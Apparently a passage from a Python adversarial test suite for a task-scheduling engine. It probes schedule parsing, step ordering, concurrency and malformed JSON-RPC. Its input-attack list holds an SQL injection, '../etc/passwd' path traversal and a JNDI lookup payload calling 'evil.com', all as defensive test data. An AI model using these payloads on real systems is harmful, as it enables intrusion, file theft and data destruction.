"""鲁棒性测试：针对每个功能设计对抗性情境。

与 trial.py（模拟正常使用）不同，这里刻意寻找边界、矛盾与恶意输入，
目标是找出实现与设计意图不符的地方。

每个测试记录：情境描述、预期、实际、判定。
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).parent
SERVER = ROOT / "server.py"
PY = sys.executable

# 测试记录
records: list[dict] = []


def record(group: str, scenario: str, expect: str, actual: str, ok: bool, severity: str = "") -> None:
    records.append({
        "group": group, "scenario": scenario, "expect": expect,
        "actual": actual, "ok": ok, "severity": severity,
    })
    mark = "\033[32m✓\033[0m" if ok else f"\033[31m✗\033[0m"
    tail = "" if ok else f"\n      预期：{expect}\n      实际：{actual}"
    print(f"  {mark} {scenario}{tail}")


class Client:
    def __init__(self, db: Path, ai_key: str = "") -> None:
        self.proc = subprocess.Popen(
            [PY, str(SERVER)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            cwd=str(ROOT), text=True, bufsize=1,
            env={"PATH": "/usr/bin:/bin", "TASK_ENGINE_DB": str(db),
                 "TASK_ENGINE_TZ": "Asia/Shanghai", "TASK_ENGINE_AI_KEY": ai_key},
        )
        self._id = 0
        self.req("initialize", {"protocolVersion": "2024-11-05", "capabilities": {}})

    def req(self, method: str, params: dict | None = None) -> dict:
        self._id += 1
        msg = {"jsonrpc": "2.0", "id": self._id, "method": method}
        if params is not None:
            msg["params"] = params
        self.proc.stdin.write(json.dumps(msg, ensure_ascii=False) + "\n")
        self.proc.stdin.flush()
        line = self.proc.stdout.readline()
        if not line:
            raise RuntimeError(f"服务无响应。stderr: {self.proc.stderr.read()}")
        return json.loads(line)

    def call(self, tool: str, args: dict | None = None) -> dict:
        return self.req("tools/call", {"name": tool, "arguments": args or {}})["result"]

    def data(self, tool: str, args: dict | None = None) -> dict:
        return self.call(tool, args)["structuredContent"]

    def err(self, tool: str, args: dict | None = None) -> str:
        """调用并返回错误消息；成功则返回空串。"""
        r = self.call(tool, args)
        return r["structuredContent"].get("error", "") if r.get("isError") else ""

    def close(self) -> None:
        try:
            self.proc.stdin.close()
            self.proc.wait(timeout=5)
        except Exception:
            self.proc.kill()


def fresh(name: str, ai_key: str = "") -> Client:
    db = ROOT / f"rb_{name}.db"
    for suffix in ("", "-wal", "-shm"):
        Path(str(db) + suffix).unlink(missing_ok=True)
    return Client(db, ai_key)


# 责任制三要素：布置任务前必须齐备
PEOPLE = [{"ref": "u1", "name": "张三"}, {"ref": "u2", "name": "李四"}]
CONFIRMER = {"ref": "boss", "name": "项目经理"}
SITE = {"ref": "wbs-3", "name": "3号楼-地下室", "code": "WBS-03-B1"}


def ready(client, template: str = "generic", **extra) -> dict:
    """建一个可直接布置的任务流。"""
    args = {"template": template, "assignees": PEOPLE,
            "confirmer": CONFIRMER, "site": SITE}
    args.update(extra)
    return client.data("create_flow_from_template", args)["flow"]


def section(title: str) -> None:
    print(f"\n\033[1m{title}\033[0m")


# ══════════════════════════════════════════════════════════
section("功能 1：自然语言生成 — 周期表述的边界")
# ══════════════════════════════════════════════════════════
c = fresh("gen")

cases = [
    # (需求, 期望的 run_mode, 期望的 unit, 说明)
    ("每周五检查基坑监测数据", "recurring", "week", "标准周期表述"),
    ("每周日巡检", "recurring", "week", "周日=ISO 7"),
    ("每天早上检查设备", "recurring", "day", "每天"),
    ("每月底盘点物资", "recurring", "month", "每月"),
    ("每季度做一次安全评估", None, None, "季度——引擎无此单位"),
    ("每半个月核查一次", "recurring", None, "半个月——歧义表述"),
    ("每隔一天巡查", "recurring", None, "「每隔」措辞"),
    ("每周一和周四都要检查", "recurring", "week", "多个星期几"),
    ("下周五检查数据", "once", None, "「下周五」非周期"),
    ("明天上午完成整改", "once", None, "明天——一次性"),
    ("立刻处理这个隐患", "once", None, "立刻——一次性"),
    ("每 0.5 天检查", None, None, "小数间隔"),
    ("每-3天检查", None, None, "负数间隔"),
    ("每365天检查一次", "recurring", "day", "大间隔但合法"),
    ("每1000个月检查", "recurring", "month", "超大间隔"),
]

for req, want_mode, want_unit, desc in cases:
    r = c.call("generate_task_flow", {"requirement": req})
    if r.get("isError"):
        record("生成-周期解析", f"{desc}：「{req}」",
               "生成可用流程（保底路径不应失败）",
               f"被拒：{r['structuredContent']['error'][:60]}", False, "高")
        continue

    flow = r["structuredContent"]["flow"]
    trig = flow["trigger"]
    steps_ok = len(flow["steps"]) >= 2

    if want_mode and trig["run_mode"] != want_mode:
        record("生成-周期解析", f"{desc}：「{req}」",
               f"run_mode={want_mode}", f"run_mode={trig['run_mode']}", False, "中")
    elif want_unit and trig["run_mode"] == "recurring" and trig["interval_unit"] != want_unit:
        record("生成-周期解析", f"{desc}：「{req}」",
               f"unit={want_unit}", f"unit={trig['interval_unit']}", False, "低")
    elif not steps_ok:
        record("生成-周期解析", f"{desc}：「{req}」", "≥2 个节点",
               f"{len(flow['steps'])} 个节点", False, "高")
    else:
        detail = f"{trig['run_mode']}"
        if trig["run_mode"] == "recurring":
            detail += f"/{trig['interval_value']}{trig['interval_unit']}"
        record("生成-周期解析", f"{desc}：「{req}」", "生成可用流程", detail, True)

# 触发时刻必须在未来
for req in ["每周五检查", "明天整改", "立刻处理", "每天巡检"]:
    r = c.data("generate_task_flow", {"requirement": req})
    first = datetime.fromisoformat(r["flow"]["trigger"]["first_at"])
    now = datetime.now(first.tzinfo)
    record("生成-时间合理性", f"「{req}」首次触发在未来",
           "first_at > 现在", f"{first.strftime('%m-%d %H:%M')}", first > now, "高")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 2：自然语言生成 — 输入极端与攻击")
# ══════════════════════════════════════════════════════════
c = fresh("gen2")

attacks = [
    ("空白字符", "    \t\n   "),
    ("仅标点", "！？。；，"),
    ("超长输入(50KB)", "检查设备" * 12500),
    ("控制字符", "检查\x00设备\x1b[31m"),
    ("emoji", "每周五🔍检查基坑💧监测数据📊"),
    ("繁体中文", "每週五檢查基坑監測數據"),
    ("中英混合", "每周五 check 基坑 monitoring data"),
    ("纯英文", "check foundation pit data every Friday"),
    ("SQL注入", "'; DROP TABLE tasks; SELECT * FROM users WHERE '1'='1"),
    ("路径穿越", "../../../etc/passwd"),
    ("模板注入", "{{7*7}} ${jndi:ldap://evil.com/a}"),
    ("JSON注入", '{"steps": [{"name": "恶意"}]}'),
    ("换行轰炸", "检查\n" * 5000),
    ("零宽字符", "每周五​‌检查数据"),
    ("RTL覆盖", "检查\u202E据数测监"),
]

for desc, payload in attacks:
    try:
        r = c.call("generate_task_flow", {"requirement": payload})
        if r.get("isError"):
            # 空白/过短被拒是合理的
            reasonable = len(payload.strip()) < 4
            record("生成-输入攻击", desc,
                   "生成流程或合理拒绝",
                   f"拒绝：{r['structuredContent']['error'][:40]}", reasonable, "中")
        else:
            flow = r["structuredContent"]["flow"]
            ok = len(flow["steps"]) >= 2 and len(flow["title"]) <= 200
            record("生成-输入攻击", desc, "生成可用流程且标题有界",
                   f"{len(flow['steps'])} 节点，标题 {len(flow['title'])} 字", ok, "中")
    except Exception as exc:
        record("生成-输入攻击", desc, "不崩溃", f"异常：{type(exc).__name__}", False, "严重")

# 数据库仍完好
try:
    r = c.data("list_flows")
    record("生成-输入攻击", "攻击后数据库完好", "可正常查询",
           f"{r['count']} 个任务流", True)
except Exception as exc:
    record("生成-输入攻击", "攻击后数据库完好", "可正常查询", str(exc), False, "严重")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 3：模板")
# ══════════════════════════════════════════════════════════
c = fresh("tpl")

tpls = c.data("list_templates")["templates"]
record("模板", "模板数量", "7 个", f"{len(tpls)} 个", len(tpls) == 7)

# 每个模板都能实例化并跑通全流程
for tpl in tpls:
    flow = ready(c, tpl["key"])
    task = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
    total = len(task["steps"])

    failed_at = None
    for seq in range(total):
        d = c.data("get_task", {"task_id": task["id"]})["task"]
        args = {"task_id": task["id"], "seq": seq, "actor": "u1"}
        if d["steps"][seq]["requires_attachment"]:
            args["attachments"] = ["proof.jpg"]
        r = c.call("complete_step", args)
        if r.get("isError"):
            failed_at = f"seq={seq}: {r['structuredContent']['error'][:50]}"
            break

    if failed_at:
        record("模板", f"「{tpl['label']}」可跑通全流程", "全部节点可完成", failed_at, False, "高")
    else:
        d = c.data("get_task", {"task_id": task["id"]})["task"]
        record("模板", f"「{tpl['label']}」可跑通全流程", "state=review",
               f"state={d['state']}", d["state"] == "review", "高")

# 模板名的各种写法
for name, should_work in [
    ("hazard_rectification", True), ("隐患整改", True),
    ("HAZARD_RECTIFICATION", False), ("隐患整改 ", False),
    ("", False), ("不存在", False), (None, False),
]:
    args = {"template": name} if name is not None else {}
    r = c.call("create_flow_from_template", args)
    worked = not r.get("isError")
    record("模板", f"模板名「{name}」",
           "接受" if should_work else "拒绝并提示可用模板",
           "接受" if worked else "拒绝", worked == should_work, "低")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 4：触发计划 — 参数边界")
# ══════════════════════════════════════════════════════════
c = fresh("sched")
flow = ready(c, "generic")

time_cases = [
    ("标准格式", "2026-08-14 09:00", True),
    ("ISO格式", "2026-08-14T09:00:00", True),
    ("带时区", "2026-08-14T09:00:00+08:00", True),
    ("仅日期", "2026-08-14", True),
    ("斜杠分隔", "2026/08/14 09:00", True),
    ("过去时刻", "2020-01-01 09:00", True),   # 应接受，立即触发
    ("非法月份", "2026-13-01 09:00", False),
    ("非法日期", "2026-02-30 09:00", False),
    ("纯文字", "下周五", False),
    ("空串", "", True),                        # 沿用 flow 自带触发
    ("数字", "12345", False),
]
for desc, value, should_work in time_cases:
    r = c.call("create_schedule", {"flow_id": flow["id"], "first_at": value})
    worked = not r.get("isError")
    record("计划-时间解析", f"{desc}：「{value}」",
           "接受" if should_work else "拒绝",
           "接受" if worked else f"拒绝：{r['structuredContent']['error'][:40]}",
           worked == should_work, "中")

# 间隔参数边界
for desc, value, unit in [
    ("零间隔", 0, "day"), ("负间隔", -5, "day"),
    ("超大间隔", 999999, "day"), ("小数间隔", 1.5, "day"),
    ("字符串间隔", "三", "day"), ("非法单位", 1, "century"),
]:
    r = c.call("create_schedule", {
        "flow_id": flow["id"], "run_mode": "recurring",
        "first_at": "2026-08-14 09:00", "interval_value": value, "interval_unit": unit,
    })
    if r.get("isError"):
        record("计划-间隔参数", f"{desc}({value} {unit})", "归一化或拒绝，不崩溃",
               f"拒绝：{r['structuredContent']['error'][:40]}", True, "低")
    else:
        s = r["structuredContent"]["schedule"]
        record("计划-间隔参数", f"{desc}({value} {unit})", "归一化到合法值",
               s["trigger_description"], True, "低")

# max_fires / until 边界
r = c.call("create_schedule", {
    "flow_id": flow["id"], "run_mode": "recurring", "first_at": "2026-08-14 09:00",
    "interval_unit": "day", "max_fires": 0,
})
record("计划-次数上限", "max_fires=0", "归一化为≥1 或拒绝",
       "拒绝" if r.get("isError") else r["structuredContent"]["schedule"]["trigger_description"],
       True, "低")

# until 早于 first_at —— 逻辑矛盾
r = c.call("create_schedule", {
    "flow_id": flow["id"], "run_mode": "recurring", "first_at": "2026-08-14 09:00",
    "interval_unit": "day", "until": "2026-01-01 09:00",
})
if r.get("isError"):
    record("计划-矛盾配置", "until 早于 first_at", "拒绝或产生空计划",
           "拒绝", True, "中")
else:
    s = r["structuredContent"]["schedule"]
    # 应当立刻是「已走完」状态
    ok = s["next_fire_at"] is None or not s["active"]
    record("计划-矛盾配置", "until 早于 first_at",
           "next_fire_at 为空（永不触发）",
           f"next={s['next_fire_at']}, active={s['active']}", ok, "中")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 5：tick 触发 — 时间线与幂等")
# ══════════════════════════════════════════════════════════
c = fresh("tick")
flow = ready(c, "generic")

# 场景：过去的首次触发时刻
c.data("create_schedule", {
    "flow_id": flow["id"], "run_mode": "once", "first_at": "2020-01-01 09:00",
})
r = c.data("tick", {"now": "2026-08-14 09:00"})
record("tick-补偿", "首次时刻在过去，tick 时应立即触发一次",
       "创建 1 个", f"创建 {r['created_count']} 个", r["created_count"] == 1, "中")

# 场景：时间倒流（now 早于上次 tick）
c2 = fresh("tick2")
flow2 = ready(c2, "generic")
c2.data("create_schedule", {
    "flow_id": flow2["id"], "run_mode": "recurring",
    "first_at": "2026-08-01 09:00", "interval_unit": "day",
})
c2.data("tick", {"now": "2026-08-05 09:00"})
before = c2.data("list_tasks")["count"]
r = c2.data("tick", {"now": "2026-08-02 09:00"})  # 时间倒流
after = c2.data("list_tasks")["count"]
record("tick-时间倒流", "now 早于上次 tick 不应重复创建",
       "任务数不变", f"{before} → {after}", after == before, "高")

# 场景：极高频 tick
c3 = fresh("tick3")
flow3 = ready(c3, "generic")
c3.data("create_schedule", {
    "flow_id": flow3["id"], "run_mode": "recurring",
    "first_at": "2026-08-01 09:00", "interval_unit": "hour", "interval_value": 1,
})
t0 = time.time()
for minute in range(0, 60 * 6, 1):  # 6 小时内每分钟 tick 一次 = 360 次
    h, m = divmod(minute, 60)
    c3.data("tick", {"now": f"2026-08-01 {9+h:02d}:{m:02d}"})
elapsed = time.time() - t0
n = c3.data("list_tasks")["count"]
record("tick-高频", "6小时每分钟tick(360次)，每小时触发→应6个",
       "6 个任务", f"{n} 个（耗时 {elapsed:.1f}s）", n == 6, "高")

# 场景：max_fires 精确性
c4 = fresh("tick4")
flow4 = ready(c4, "generic")
c4.data("create_schedule", {
    "flow_id": flow4["id"], "run_mode": "recurring", "first_at": "2026-08-01 09:00",
    "interval_unit": "day", "max_fires": 3,
})
for day in range(1, 15):
    c4.data("tick", {"now": f"2026-08-{day:02d} 09:00"})
n = c4.data("list_tasks")["count"]
record("tick-次数上限", "max_fires=3，连续14天tick",
       "恰好 3 个", f"{n} 个", n == 3, "高")

# 场景：until 边界精确性
c5 = fresh("tick5")
flow5 = ready(c5, "generic")
c5.data("create_schedule", {
    "flow_id": flow5["id"], "run_mode": "recurring", "first_at": "2026-08-01 09:00",
    "interval_unit": "day", "until": "2026-08-03 09:00",
})
for day in range(1, 10):
    c5.data("tick", {"now": f"2026-08-{day:02d} 09:00"})
n = c5.data("list_tasks")["count"]
record("tick-截止边界", "until=8/3，含边界应触发 8/1、8/2、8/3",
       "3 个", f"{n} 个", n == 3, "中")

for cli in (c, c2, c3, c4, c5):
    cli.close()

# ══════════════════════════════════════════════════════════
section("功能 6：月末与闰年 — 长期节奏精确性")
# ══════════════════════════════════════════════════════════
c = fresh("month")
flow = ready(c, "generic")
c.data("create_schedule", {
    "flow_id": flow["id"], "run_mode": "recurring",
    "first_at": "2028-01-31 09:00", "interval_unit": "month",  # 2028 是闰年
})
fires = []
cursor = datetime(2028, 1, 1, 9, 0)
while cursor < datetime(2028, 8, 1):
    r = c.data("tick", {"now": cursor.strftime("%Y-%m-%d %H:%M")})
    if r["created_count"]:
        fires.append(cursor.strftime("%m-%d"))
    cursor += timedelta(days=1)

expected = ["01-31", "02-29", "03-31", "04-30", "05-31", "06-30", "07-31"]
record("月末-闰年", "2028(闰年)1/31起按月，2月应为29日",
       str(expected), str(fires), fires == expected, "高")

# 30日起始
c2 = fresh("month2")
flow2 = ready(c2, "generic")
c2.data("create_schedule", {
    "flow_id": flow2["id"], "run_mode": "recurring",
    "first_at": "2026-01-30 09:00", "interval_unit": "month",
})
fires2 = []
cursor = datetime(2026, 1, 1, 9, 0)
while cursor < datetime(2026, 6, 1):
    r = c2.data("tick", {"now": cursor.strftime("%Y-%m-%d %H:%M")})
    if r["created_count"]:
        fires2.append(cursor.strftime("%m-%d"))
    cursor += timedelta(days=1)
expected2 = ["01-30", "02-28", "03-30", "04-30", "05-30"]
record("月末-30日", "1/30起按月，2月夹到28日后应回到30日",
       str(expected2), str(fires2), fires2 == expected2, "高")

# 跨年
c3 = fresh("month3")
flow3 = ready(c3, "generic")
c3.data("create_schedule", {
    "flow_id": flow3["id"], "run_mode": "recurring",
    "first_at": "2026-11-30 09:00", "interval_unit": "month", "interval_value": 2,
})
fires3 = []
cursor = datetime(2026, 11, 1, 9, 0)
while cursor < datetime(2027, 8, 1):
    r = c3.data("tick", {"now": cursor.strftime("%Y-%m-%d %H:%M")})
    if r["created_count"]:
        fires3.append(cursor.strftime("%Y-%m-%d"))
    cursor += timedelta(days=1)
expected3 = ["2026-11-30", "2027-01-30", "2027-03-30", "2027-05-30", "2027-07-30"]
record("月末-跨年", "每2月，从2026-11-30跨年",
       str(expected3), str(fires3), fires3 == expected3, "中")

for cli in (c, c2, c3):
    cli.close()

# ══════════════════════════════════════════════════════════
section("功能 7：节点流转 — 顺序约束的各种绕过尝试")
# ══════════════════════════════════════════════════════════
c = fresh("flow")
flow = ready(c, "generic")
task = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
tid = task["id"]

# 各种越界与非法序号
for desc, seq in [
    ("跨越到第2个", 1), ("跨越到最后", 3), ("超大序号", 99999),
    ("负序号", -1), ("负序号-2", -2), ("小数序号", 1.5),
    ("字符串序号", "0"), ("布尔序号", True),
]:
    r = c.call("complete_step", {"task_id": tid, "seq": seq})
    rejected = r.get("isError", False)
    # seq=0 的等价形式（"0"/False）理论上可能被接受
    expect_reject = seq not in (0,)
    record("流转-序号校验", f"{desc} (seq={seq!r})",
           "拒绝" if expect_reject else "接受",
           "拒绝" if rejected else "接受", rejected == expect_reject, "中")

# 正常完成第一个
c.data("complete_step", {"task_id": tid, "seq": 0, "actor": "u1"})

# 完成后再尝试回头操作
r = c.call("complete_step", {"task_id": tid, "seq": 0})
record("流转-回头操作", "重复完成已完成节点", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "高")

r = c.call("forward_step", {"task_id": tid, "seq": 0, "to_ref": "u9"})
record("流转-回头操作", "改派已完成节点（篡改历史）", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "严重")

r = c.call("block_step", {"task_id": tid, "seq": 0, "reason": "x"})
record("流转-回头操作", "阻塞已完成节点", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "中")

# 跳过必经节点
r = c.call("skip_step", {"task_id": tid, "seq": 1})
record("流转-跳过", "跳过必经节点", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "高")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 8：附件约束")
# ══════════════════════════════════════════════════════════
c = fresh("attach")
flow = ready(c, "hazard_rectification")
task = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
tid = task["id"]

for desc, attachments, should_pass in [
    ("不传附件字段", None, False),
    ("空数组", [], False),
    ("空字符串元素", [""], True),      # 有元素即视为已提交（可能是问题）
    ("正常附件", ["photo.jpg"], True),
    ("多个附件", ["a.jpg", "b.pdf"], True),
    ("超长文件名", ["x" * 10000 + ".jpg"], True),
    ("路径穿越文件名", ["../../etc/passwd"], True),
]:
    # 每次用新任务，避免状态污染
    t = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
    args = {"task_id": t["id"], "seq": 0, "actor": "u1"}
    if attachments is not None:
        args["attachments"] = attachments
    r = c.call("complete_step", args)
    passed = not r.get("isError")
    sev = "中" if desc in ("空字符串元素",) else "低"
    record("附件约束", desc,
           "通过" if should_pass else "拒绝",
           "通过" if passed else "拒绝", passed == should_pass, sev)

c.close()

# ══════════════════════════════════════════════════════════
section("功能 9：受阻与恢复的状态一致性")
# ══════════════════════════════════════════════════════════
c = fresh("block")
flow = ready(c, "generic")

# 阻塞 → 完成 → 状态应恢复
t = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
c.data("block_step", {"task_id": t["id"], "seq": 0, "reason": "等材料"})
c.data("complete_step", {"task_id": t["id"], "seq": 0})
d = c.data("get_task", {"task_id": t["id"]})["task"]
record("受阻-一致性", "完成受阻节点后任务状态恢复",
       "state=running", f"state={d['state']}", d["state"] == "running", "高")

# 重复阻塞
t2 = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
c.data("block_step", {"task_id": t2["id"], "seq": 0, "reason": "a"})
r = c.call("block_step", {"task_id": t2["id"], "seq": 0, "reason": "b"})
record("受阻-幂等", "重复阻塞同一节点", "不崩溃",
       "拒绝" if r.get("isError") else "接受", True, "低")

# 未阻塞就解除
t3 = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
r = c.call("unblock_step", {"task_id": t3["id"], "seq": 0})
record("受阻-非法解除", "解除未受阻的节点", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "中")

# 阻塞 → 转办 → 状态
t4 = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
c.data("block_step", {"task_id": t4["id"], "seq": 0, "reason": "人不在"})
r = c.call("forward_step", {"task_id": t4["id"], "seq": 0, "to_ref": "u2", "to_name": "李四"})
d = c.data("get_task", {"task_id": t4["id"]})["task"]
record("受阻-转办", "受阻节点可转办给他人",
       "允许（换人可能正是解阻手段）",
       f"{'允许' if not r.get('isError') else '拒绝'}，state={d['state']}",
       not r.get("isError"), "低")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 10：验收与退回")
# ══════════════════════════════════════════════════════════
c = fresh("review")
flow = ready(c, "generic")


def finish_all(client, flow_id):
    t = client.data("dispatch_task", {"flow_id": flow_id})["task"]
    for seq in range(len(t["steps"])):
        d = client.data("get_task", {"task_id": t["id"]})["task"]
        args = {"task_id": t["id"], "seq": seq, "actor": "u1"}
        if d["steps"][seq]["requires_attachment"]:
            args["attachments"] = ["p.jpg"]
        client.data("complete_step", args)
    return t["id"]


# 非 review 状态验收
t = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
r = c.call("accept_task", {"task_id": t["id"]})
record("验收-状态校验", "运行中的任务直接验收", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "高")

# 正常验收
tid = finish_all(c, flow["id"])
c.data("accept_task", {"task_id": tid, "actor": "boss"})
d = c.data("get_task", {"task_id": tid})["task"]
record("验收-正常", "全部完成后验收", "state=done",
       f"state={d['state']}", d["state"] == "done", "高")

# 重复验收
r = c.call("accept_task", {"task_id": tid})
record("验收-重复", "重复验收已完成任务", "拒绝",
       "拒绝" if r.get("isError") else "接受", r.get("isError", False), "中")

# 退回后重做再验收
tid2 = finish_all(c, flow["id"])
c.data("reject_task", {"task_id": tid2, "reason": "材料不清"})
d = c.data("get_task", {"task_id": tid2})["task"]
reopened = d["current_step"]
record("退回-重开节点", "退回后最后节点重新打开",
       "state=running 且有当前节点",
       f"state={d['state']}, current={reopened['name'] if reopened else None}",
       d["state"] == "running" and reopened is not None, "高")

# 多次退回
for i in range(3):
    d = c.data("get_task", {"task_id": tid2})["task"]
    seq = d["current_step"]["seq"]
    args = {"task_id": tid2, "seq": seq}
    if d["steps"][seq]["requires_attachment"]:
        args["attachments"] = ["x.jpg"]
    c.data("complete_step", args)
    c.data("reject_task", {"task_id": tid2, "reason": f"第{i+1}次退回"})
d = c.data("get_task", {"task_id": tid2})["task"]
record("退回-多次", "连续退回3次不破坏状态",
       "state=running", f"state={d['state']}", d["state"] == "running", "中")

# 取消后的操作
t3 = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
c.data("cancel_task", {"task_id": t3["id"], "reason": "项目暂停"})
for tool, args in [
    ("complete_step", {"task_id": t3["id"], "seq": 0}),
    ("forward_step", {"task_id": t3["id"], "seq": 0, "to_ref": "u2"}),
    ("accept_task", {"task_id": t3["id"]}),
    ("cancel_task", {"task_id": t3["id"]}),
]:
    r = c.call(tool, args)
    record("终态-防护", f"已取消任务上调用 {tool}", "拒绝",
           "拒绝" if r.get("isError") else "接受", r.get("isError", False), "高")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 11：逾期判定")
# ══════════════════════════════════════════════════════════
c = fresh("overdue")
flow = ready(c, "generic")

t = c.data("dispatch_task", {"flow_id": flow["id"]})["task"]
due = t["due_at"]

# 恰好在截止时刻——不应逾期
r = c.data("tick", {"now": due})
record("逾期-边界", "恰好在截止时刻 tick", "不标记逾期",
       f"{len(r['overdue_task_ids'])} 个被标记", t["id"] not in r["overdue_task_ids"], "中")

# 超过 1 秒
later = (datetime.fromisoformat(due) + timedelta(seconds=1)).isoformat()
r = c.data("tick", {"now": later})
record("逾期-边界", "超过截止 1 秒", "标记逾期",
       f"{len(r['overdue_task_ids'])} 个被标记", t["id"] in r["overdue_task_ids"], "中")

# 重复扫描不重复标记
r = c.data("tick", {"now": later})
record("逾期-幂等", "重复 tick 不重复标记", "0 个",
       f"{len(r['overdue_task_ids'])} 个", len(r["overdue_task_ids"]) == 0, "中")

# 逾期后仍可继续办理
r = c.call("complete_step", {"task_id": t["id"], "seq": 0})
d = c.data("get_task", {"task_id": t["id"]})["task"]
record("逾期-可恢复", "逾期任务完成节点后恢复运行",
       "允许且 state=running",
       f"{'允许' if not r.get('isError') else '拒绝'}，state={d['state']}",
       not r.get("isError") and d["state"] == "running", "高")

# 已完成任务不会被标记逾期
tid = finish_all(c, flow["id"])
c.data("accept_task", {"task_id": tid})
r = c.data("tick", {"now": "2030-01-01 09:00"})
record("逾期-终态豁免", "已完成任务不被标记逾期",
       "不在逾期列表", f"{'在' if tid in r['overdue_task_ids'] else '不在'}",
       tid not in r["overdue_task_ids"], "高")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 12：查询与分页")
# ══════════════════════════════════════════════════════════
c = fresh("query")
flow = ready(c, "generic")

for _ in range(25):
    c.data("dispatch_task", {"flow_id": flow["id"]})

for desc, args, check_fn in [
    ("默认分页", {}, lambda r: r["count"] == 20),
    ("limit=5", {"limit": 5}, lambda r: r["count"] == 5),
    ("limit=0", {"limit": 0}, lambda r: r["count"] >= 0),
    ("limit=-1", {"limit": -1}, lambda r: r["count"] >= 0),
    ("limit超上限", {"limit": 99999}, lambda r: r["count"] <= 100),
    ("offset超范围", {"offset": 99999}, lambda r: r["count"] == 0),
    ("offset负数", {"offset": -5}, lambda r: r["count"] >= 0),
    ("不存在的人", {"assignee": "u_nobody"}, lambda r: r["count"] == 0),
    ("不存在的状态", {"state": "不存在"}, lambda r: r["count"] == 0),
    ("空字符串assignee", {"assignee": ""}, lambda r: r["count"] > 0),
]:
    try:
        r = c.data("list_tasks", args)
        record("查询-参数", desc, "不崩溃且结果合理",
               f"{r['count']} 条", check_fn(r), "低")
    except Exception as exc:
        record("查询-参数", desc, "不崩溃", f"异常：{exc}", False, "中")

# 类型错误应返回明确的工具错误，而非静默转换或未处理异常
for desc, args in [
    ("limit非数字", {"limit": "很多"}),
    ("limit为字符串数字", {"limit": "10"}),
    ("offset非数字", {"offset": "第二页"}),
]:
    r = c.call("list_tasks", args)
    is_error = r.get("isError", False)
    msg = r["structuredContent"].get("error", "") if is_error else ""
    record("查询-类型校验", desc, "返回工具错误并说明需要整数",
           f"拒绝：{msg[:40]}" if is_error else "静默接受",
           is_error and "整数" in msg, "中")

# 分页无重叠无遗漏
seen = set()
for offset in range(0, 25, 10):
    page = c.data("list_tasks", {"limit": 10, "offset": offset})["tasks"]
    ids = {t["id"] for t in page}
    overlap = seen & ids
    if overlap:
        record("查询-分页", f"offset={offset} 与前页重叠", "无重叠",
               f"{len(overlap)} 条重复", False, "中")
    seen |= ids
record("查询-分页", "翻页覆盖全部记录", "25 条", f"{len(seen)} 条", len(seen) == 25, "中")

c.close()

# ══════════════════════════════════════════════════════════
section("功能 13：并发与持久化")
# ══════════════════════════════════════════════════════════
db = ROOT / "rb_concurrent.db"
for suffix in ("", "-wal", "-shm"):
    Path(str(db) + suffix).unlink(missing_ok=True)

clients = [Client(db) for _ in range(4)]
flow = ready(clients[0], "generic")

# 4 客户端同时看到同一数据
task = clients[0].data("dispatch_task", {"flow_id": flow["id"]})["task"]
visible = sum(1 for cl in clients if cl.data("list_tasks")["count"] == 1)
record("并发-可见性", "4 个客户端都能看到新任务", "4 个",
       f"{visible} 个", visible == 4, "高")

# 4 客户端抢同一节点
results = [cl.call("complete_step", {"task_id": task["id"], "seq": 0, "actor": f"u{i}"})
           for i, cl in enumerate(clients)]
succeeded = sum(1 for r in results if not r.get("isError"))
record("并发-抢占", "4 客户端同时完成同一节点", "恰好 1 个成功",
       f"{succeeded} 个成功", succeeded == 1, "严重")

# 4 客户端同时 tick 同一计划
clients[0].data("create_schedule", {
    "flow_id": flow["id"], "run_mode": "once", "first_at": "2026-08-14 09:00",
})
before = clients[0].data("list_tasks")["count"]
tick_results = [cl.data("tick", {"now": "2026-08-14 09:00"}) for cl in clients]
total_created = sum(r["created_count"] for r in tick_results)
record("并发-tick", "4 客户端同时 tick 同一到期计划", "共创建 1 个",
       f"共创建 {total_created} 个", total_created == 1, "严重")

for cl in clients:
    cl.close()

# 重启后数据完整
c = Client(db)
n = c.data("list_tasks")["count"]
d = c.data("get_task", {"task_id": task["id"]})["task"]
record("持久化-重启", "重启后任务与历史完整",
       "任务可读且有历史", f"{n} 个任务，{len(d['history'])} 条历史",
       n > 0 and len(d["history"]) > 0, "高")
c.close()

# ══════════════════════════════════════════════════════════
section("功能 14：协议层健壮性")
# ══════════════════════════════════════════════════════════
c = fresh("proto")

# 畸形 JSON-RPC
raw_cases = [
    ("非JSON", "这不是json"),
    ("JSON数组", '[1,2,3]'),
    ("JSON字符串", '"hello"'),
    ("缺method", '{"jsonrpc":"2.0","id":1}'),
    ("method为数字", '{"jsonrpc":"2.0","id":1,"method":123}'),
    ("params为数组", '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":[1,2]}'),
    ("超深嵌套", '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"list_tasks","arguments":' + '{"a":' * 100 + '1' + '}' * 100 + '}}'),
]
for desc, raw in raw_cases:
    try:
        c.proc.stdin.write(raw + "\n")
        c.proc.stdin.flush()
        line = c.proc.stdout.readline()
